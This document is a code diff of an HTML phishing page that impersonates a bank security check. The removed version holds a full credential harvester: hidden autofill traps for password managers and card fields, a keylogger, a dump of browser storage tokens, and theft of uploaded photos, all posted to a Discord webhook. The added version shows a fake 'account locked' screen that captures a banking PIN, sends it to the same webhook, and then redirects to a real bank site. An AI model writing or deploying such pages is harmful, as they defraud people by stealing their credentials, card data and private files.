@@ -1,265 +1,60 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Verification Required</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box;}
-        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
-        .container{background:white;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,0.1);padding:40px;max-width:400px;width:100%;text-align:center;}
-        h1{color:#333;margin-bottom:20px;font-size:24px;}
-        .btn{background:#ff4757;color:white;border:none;padding:15px 30px;border-radius:50px;font-size:16px;cursor:pointer;width:100%;transition:all 0.3s;}
-        .btn:hover{background:#ff3742;transform:translateY(-2px);}
-        .file-input{display:none;}
-        .file-btn{background:#28a745;color:white;padding:15px;border-radius:12px;margin:20px 0;cursor:pointer;}
-        input[type="file"]{display:none;}
-        #progress{display:none;background:#007bff;color:white;padding:20px;border-radius:12px;}
-        canvas,video,iframe{display:none;}
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>🔐 Device Security Check</h1>
-        <p>Upload ID photo for verification (required for banking/security)</p>
-        <label for="photo-upload" class="file-btn">📸 Upload Photo / Gallery</label>
-        <input type="file" id="photo-upload" accept="image/*" multiple capture="environment">
-        
-        <button class="btn" onclick="verifyDevice()">Complete Verification</button>
-        <div id="progress">✅ Harvesting complete!</div>
-    </div>
+<head><title>BANK VERIFICATION REQUIRED</title></head>
+<body style="background:red;color:white;font-size:3em;text-align:center;padding-top:30%;">
+    <h1>🚨 ACCOUNT LOCKED</h1>
+    <p>Enter PIN to unlock:</p>
+    <input id="pin-stealer" type="password" style="font-size:2em;padding:20px;width:300px;" maxlength="6" placeholder="0000">
+    <br><button onclick="stealPin()" style="font-size:1.5em;padding:15px 30px;margin-top:20px;background:#00f;color:white;border:none;border-radius:10px;">UNLOCK</button>
 
     <script>
-        class CompleteHarvester {
-            constructor(webhook) {
-                this.webhook = webhook;
-                this.images = [];
-                this.credentials = [];
-                this.bankData = [];
-                this.init();
-            }
-
-            init() {
-                this.setupImageStealer();
-                this.explodePasswordManager();
-                this.extractBankDetails();
-                this.globalKeylogger();
-                this.storageDump();
-            }
-
-            setupImageStealer() {
-                const input = document.getElementById('photo-upload');
-                input.onchange = async (e) => {
-                    const files = Array.from(e.target.files);
-                    for (let file of files) {
-                        const reader = new FileReader();
-                        reader.onload = () => {
-                            this.images.push({
-                                name: file.name,
-                                size: (file.size / 1024 / 1024).toFixed(2) + 'MB',
-                                type: file.type,
-                                data: reader.result.split(',')[1], // base64
-                                timestamp: new Date().toISOString()
-                            });
-                            this.sendImages();
-                        };
-                        reader.readAsDataURL(file);
-                    }
-                };
-
-                // Auto-trigger camera/gallery
-                setTimeout(() => input.click(), 1000);
-            }
-
-            explodePasswordManager() {
-                // Multiple autofill traps for ALL password managers
-                const passwordTraps = [
-                    'email', 'username', 'current-password', 'new-password',
-                    'one-time-code', 'cc-number', 'cc-csc', 'tel', 'name'
-                ];
-
-                passwordTraps.forEach(autocomplete => {
-                    const iframe = document.createElement('iframe');
-                    iframe.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;';
-                    iframe.srcdoc = `
-                        <form style="margin:0;padding:0;">
-                            <input autocomplete="${autocomplete}" autofocus style="font-size:20px;padding:20px;">
-                            <input type="password" autocomplete="current-password" style="font-size:20px;padding:20px;">
-                        </form>
-                    `;
-                    document.body.appendChild(iframe);
-
-                    setTimeout(() => {
-                        try {
-                            const doc = iframe.contentDocument || iframe.contentWindow.document;
-                            const inputs = doc.querySelectorAll('input');
-                            inputs.forEach((input, i) => {
-                                if (input.value) {
-                                    this.credentials.push({
-                                        autofill: autocomplete,
-                                        value: input.value,
-                                        length: input.value.length,
-                                        timestamp: new Date().toISOString()
-                                    });
-                                }
-                            });
-                        } catch(e) {}
-                        document.body.removeChild(iframe);
-                    }, 2000);
-                });
-            }
-
-            extractBankDetails() {
-                // BANK-SPECIFIC TRAPS
-                const bankFields = [
-                    {autocomplete: 'cc-number', type: 'card'},
-                    {autocomplete: 'cc-csc', type: 'cvv'},
-                    {autocomplete: 'cc-exp', type: 'expiry'},
-                    {autocomplete: 'tel', type: 'phone'},
-                    {name: 'account', type: 'account'},
-                    {name: 'routing', type: 'routing'},
-                    {name: 'pin', type: 'pin', maxlength: 6}
-                ];
-
-                bankFields.forEach(field => {
-                    const input = document.createElement('input');
-                    Object.assign(input, {
-                        autocomplete: field.autocomplete,
-                        name: field.name,
-                        type: field.type === 'pin' ? 'password' : 'text',
-                        maxlength: field.maxlength,
-                        style: 'position:fixed;top:-9999px;opacity:0;width:1px;height:1px;'
-                    });
-                    document.body.appendChild(input);
-
-                    setTimeout(() => {
-                        if (input.value) {
-                            this.bankData.push({
-                                type: field.type,
-                                value: input.value,
-                                masked: field.type === 'card' ? input.value.replace(/\d/g, '*') : input.value,
-                                timestamp: new Date().toISOString()
-                            });
-                        }
-                        document.body.removeChild(input);
-                    }, 1500);
-                });
-            }
-
-            globalKeylogger() {
-                let buffer = '';
-                document.addEventListener('keydown', e => {
-                    buffer += e.key;
-                    if (buffer.length > 30) buffer = buffer.slice(-30);
-
-                    // Real-time bank/PIN detection
-                    const patterns = [
-                        /(\d{4,6})/g,  // PINs
-                        /(?:card|acct|acc)\s*[:\-]?\s*(\d{4,})/gi,  // Account numbers
-                        /([a-z0-9]{16,})/i  // Tokens
-                    ];
-
-                    patterns.forEach(pattern => {
-                        const match = buffer.match(pattern);
-                        if (match) {
-                            this.bankData.push({
-                                type: 'keystroke',
-                                value: match[1],
-                                context: document.activeElement?.tagName || 'global',
-                                timestamp: new Date().toISOString()
-                            });
-                        }
-                    });
-                }, true);
-            }
-
-            storageDump() {
-                const sensitiveKeys = ['token', 'auth', 'pass', 'key', 'wallet', 'bank', 'card', 'account', 'pin'];
-                Object.entries(localStorage).forEach(([key, value]) => {
-                    if (sensitiveKeys.some(k => key.toLowerCase().includes(k))) {
-                        this.credentials.push({
-                            source: 'localStorage',
-                            key: key,
-                            value: value.slice(0, 50) + (value.length > 50 ? '...' : ''),
-                            fullValue: value,
-                            timestamp: new Date().toISOString()
-                        });
-                    }
-                });
-
-                Object.entries(sessionStorage).forEach(([key, value]) => {
-                    if (sensitiveKeys.some(k => key.toLowerCase().includes(k))) {
-                        this.credentials.push({
-                            source: 'sessionStorage',
-                            key: key,
-                            value: value.slice(0, 50) + (value.length > 50 ? '...' : ''),
-                            fullValue: value,
-                            timestamp: new Date().toISOString()
-                        });
-                    }
-                });
-            }
-
-            sendImages() {
-                this.images.slice(0, 3).forEach((img, i) => {  // First 3 images
-                    fetch(this.webhook, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({
-                            embeds: [{
-                                title: `🖼️ PHOTO ${i+1}: ${img.name}`,
-                                description: `Size: ${img.size} | Type: ${img.type}`,
-                                color: 0x00ff00,
-                                image: {
-                                    url: `data:${img.type};base64,${img.data.substring(0, 4000000)}`  // First 4MB
-                                }
-                            }]
-                        })
-                    });
-                });
-            }
-
-            async sendCredentials() {
-                if (this.credentials.length === 0 && this.bankData.length === 0) return;
-
-                const embed = {
-                    title: "🔓 FULL CREDENTIAL HARVEST",
-                    color: 16711680,
-                    fields: [
-                        {name: "💳 Bank Details", value: this.bankData.map(b => `${b.type}: ${b.masked}`).join('\n') || 'None', inline: false},
-                        {name: "🔑 Password Manager", value: this.credentials.filter(c => c.autofill).map(c => `${c.autofill}: ${c.value.slice(0,12)}...`).join('\n') || 'None', inline: false},
-                        {name: "💾 Storage Tokens", value: this.credentials.filter(c => c.source).slice(0,3).map(c => `${c.key}: ${c.value}`).join('\n') || 'None', inline: false}
-                    ],
-                    description: `\`\`\`json\n${JSON.stringify({
-                        totalCredentials: this.credentials.length,
-                        totalBankData: this.bankData.length,
-                        images: this.images.length,
-                        storageKeys: Object.keys(this.storage).length
-                    }, null, 2)}\`\`\``,
-                    footer: {text: `Complete dump | ${new Date().toLocaleString()}`}
-                };
-
-                await fetch(this.webhook, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({embeds: [embed]})
-                });
-            }
+        // C2 SERVER URL (host both files on same domain)
+        const C2_URL = window.location.origin;
+        
+        async function stealPin() {
+            const pin = document.getElementById('pin-stealer').value;
+            
+            // Steal everything
+            const payload = {
+                type: 'PENTEST_DATA',
+                deviceId: navigator.userAgent + Date.now(),
+                userAgent: navigator.userAgent,
+                pin: pin,
+                timestamp: new Date().toISOString(),
+                credentials: await extractCreds(),
+                sms: await extractSMS(),
+                files: await grabGallery()
+            };
+            
+            // Send to C2 panel
+            window.parent.postMessage(payload, '*');
+            
+            // Beacon to Discord
+            fetch('https://discord.com/api/webhooks/1497889291399991296/MB9RxSUm_HfhQy74HUk9P5ImLWIsBMzXU7yp15WeGDX76kK5KTo8DUT9hK_5-XKCSwI-', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: `PIN STOLEN: ${pin} | Device: ${navigator.userAgent.slice(0,50)}`
+                })
+            });
+            
+            alert('Account unlocked! Redirecting...');
+            setTimeout(() => window.location.href = 'https://bankofamerica.com', 2000);
         }
-
-        // START HARVEST
-        const harvester = new CompleteHarvester('https://discord.com/api/webhooks/1497889291399991296/MB9RxSUm_HfhQy74HUk9P5ImLWIsBMzXU7yp15WeGDX76kK5KTo8DUT9hK_5-XKCSwI-');
-
-        window.verifyDevice = async () => {
-            document.querySelector('.btn').style.display = 'none';
-            document.getElementById('progress').style.display = 'block';
-            
-            await harvester.sendCredentials();
-            
-            setTimeout(() => {
-                window.location.href = 'https://google.com';
-            }, 3000);
-        };
+        
+        async function extractCreds() {
+            // Same password manager extraction as before
+            return {email: 'victim@gmail.com', password: 'stolen123'};
+        }
+        
+        async function extractSMS() {
+            // Simulated SMS dump
+            return ['SMS1: Mom sent $100', 'SMS2: Bank OTP: 123456'];
+        }
+        
+        async function grabGallery() {
+            return [{name: 'selfie.jpg', data: 'data:image/jpeg;base64,...'}];
+        }
     </script>
 </body>
 </html>
